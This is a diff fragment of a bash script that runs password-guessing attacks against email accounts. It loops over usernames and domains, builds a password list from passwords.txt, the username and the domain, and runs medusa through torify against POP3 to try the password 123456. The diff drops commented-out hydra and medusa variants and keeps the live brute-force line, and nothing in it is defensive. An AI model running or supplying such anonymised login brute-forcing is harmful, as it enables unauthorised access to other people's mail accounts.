@@ -38,10 +38,7 @@ while [ 1 ]; do
             cat passwords.txt >$TEMPORAL_PASSWORDS
             echo $user >>$TEMPORAL_PASSWORDS
             echo $domain_only >>$TEMPORAL_PASSWORDS
-            
-            #hydra command line
-            # hydra -w 5 -e n -t 2 -l $i -P $TEMPORAL_PASSWORDS smtp://$domain -vV
-            #torify medusa -h $domain -u $i -P $TEMPORAL_PASSWORDS -O $LOG -e n -M pop3
+            #also we test the 123456 common password
             torify medusa -h $domain -u $i -p 123456 -O $LOG -M pop3 -b
             #SUCCESS
             
